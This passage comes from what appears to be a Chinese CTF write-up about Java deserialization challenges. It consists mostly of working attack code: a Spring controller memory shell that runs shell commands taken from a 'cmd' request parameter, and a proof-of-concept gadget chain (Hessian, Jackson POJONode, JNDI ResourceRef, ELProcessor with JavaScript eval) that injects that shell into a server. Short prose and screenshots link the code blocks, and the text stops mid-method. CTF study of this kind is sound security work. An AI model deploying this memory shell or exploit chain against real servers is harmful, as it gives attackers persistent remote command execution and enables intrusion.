class="comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span></span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeInt(<span class="number">1949</span>);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;NEEPU&quot;</span>);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        System.out.println(ois.readInt());</span><br><span class="line">        System.out.println(ois.readUTF());</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">unhash</span> <span class="params">( <span class="type">int</span> hash )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">answer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> ( target &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">            answer.append(<span class="string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( target == Integer.MIN_VALUE )</span><br><span class="line">                <span class="keyword">return</span> answer.toString();</span><br><span class="line">            <span class="comment">// Find target without sign bit set</span></span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        <span class="keyword">return</span> answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unhash0</span> <span class="params">( StringBuilder partial, <span class="type">int</span> target )</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">div</span> <span class="operator">=</span> target / <span class="number">31</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rem</span> <span class="operator">=</span> target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( div != <span class="number">0</span> )</span><br><span class="line">                partial.append((<span class="type">char</span>) div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((<span class="type">char</span>) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>内存马：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectToController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span>(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> InjectToController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/Flag&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">InjectToController</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectToController</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二个构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectToController</span><span class="params">(String aaa)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// controller指定的处理方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span>  IOException&#123;</span><br><span class="line">        <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exec</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">arg0</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span></span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打入！即可注入内存马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675462604-28682a17-1968-40b7-b690-fe16861ab23d.png#averageHue=%23fefefe&clientId=u1e86b3c8-0e66-4&from=paste&height=397&id=u1f39856e&originHeight=496&originWidth=1517&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15115&status=done&style=none&taskId=u8ed5b848-ed91-4416-ab5c-4b3534a0a6f&title=&width=1213.6" alt="image.png"></p>
<h2 id="是不是有Bean"><a href="#是不是有Bean" class="headerlink" title="是不是有Bean"></a>是不是有Bean</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684675643846-961624d6-cb4d-4d7f-8f8a-f903ff4a0f7d.png#averageHue=%232a2b29&clientId=u1e86b3c8-0e66-4&from=paste&height=652&id=ucda372aa&originHeight=815&originWidth=779&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=987020&status=done&style=none&taskId=u0232a872-84fc-4bd1-9faa-2b61c52b37b&title=&width=623.2" alt="image.png"><br>有hessian有hibernate有jackson，东西挺多的。<br>我的解法是hessian+tosrring+jackson+memshell<br>不知道是不是非预期，POC如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.resinchain;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ELProcessChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\Java\\ResinChain\\target\\classes\\com\\example\\resinchain\\InjectToController.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="type">String</span> <span class="variable">x</span> <span class="operator">=</span> <span class="string">&quot;var str=&#x27;&quot;</span>+s1+<span class="string">&quot;&#x27;;var Thread = Java.type(&#x27;java.lang.Thread&#x27;);var tt=Thread.currentThread().getContextClassLoader();var b64 = Java.type(&#x27;sun.misc.BASE64Decoder&#x27;);var b=new b64().decodeBuffer(str);var byteArray = Java.type(&#x27;byte[]&#x27;);var int = Java.type(&#x27;int&#x27;);var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc = defineClassMethod.invoke(tt,b,0,b.length);cc.newInstance();&quot;</span>;</span><br><span class="line">        <span class="comment">//String x = &quot;java.lang.Runtime.getRuntime().exec(\\\&quot;calc\\\&quot;)&quot;;</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;pupi1=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;pupi1&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;</span>+ x +<span class="string">&quot;\&quot;)&quot;</span>));</span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationDirContext&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cpe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(resourceRef);</span><br><span class="line">        <span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> (DirContext) ccCons.newInstance(cpe, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line"><span class="comment">//       jdk.nashorn.internal.objects.NativeString str = new jdk.nashorn.internal.objects.NativeString();</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(ctx);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        baos.write(<span class="number">79</span>);</span><br><span class="line">        out.setSerializerFactory(<span class="keyword">new</span> <span class="title class_">SerializerFactory</span>());</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//out.getSerializerFactory().setAllowNonSerializable(true);</span></span><br><span class="line">        out.writeObject(jsonNodes);</span><br><span class="line">        <span class="comment">//out.flushBuffer();</span></span><br><span class="line">        out.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="comment">//input.readObject();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        